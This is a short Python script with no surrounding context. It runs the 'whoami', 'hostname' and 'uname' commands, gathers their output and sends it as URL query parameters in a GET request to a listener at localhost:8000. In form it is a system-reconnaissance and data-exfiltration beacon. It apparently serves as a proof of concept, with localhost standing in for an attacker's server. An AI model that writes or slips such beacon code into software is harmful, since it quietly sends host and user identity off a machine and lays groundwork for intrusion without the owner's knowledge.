import requests
import urllib
import subprocess
from subprocess import PIPE, STDOUT

commands = ['whoami','hostname','uname']
out = {}

for command in commands:
    try:
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
    except:
        pass

requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))
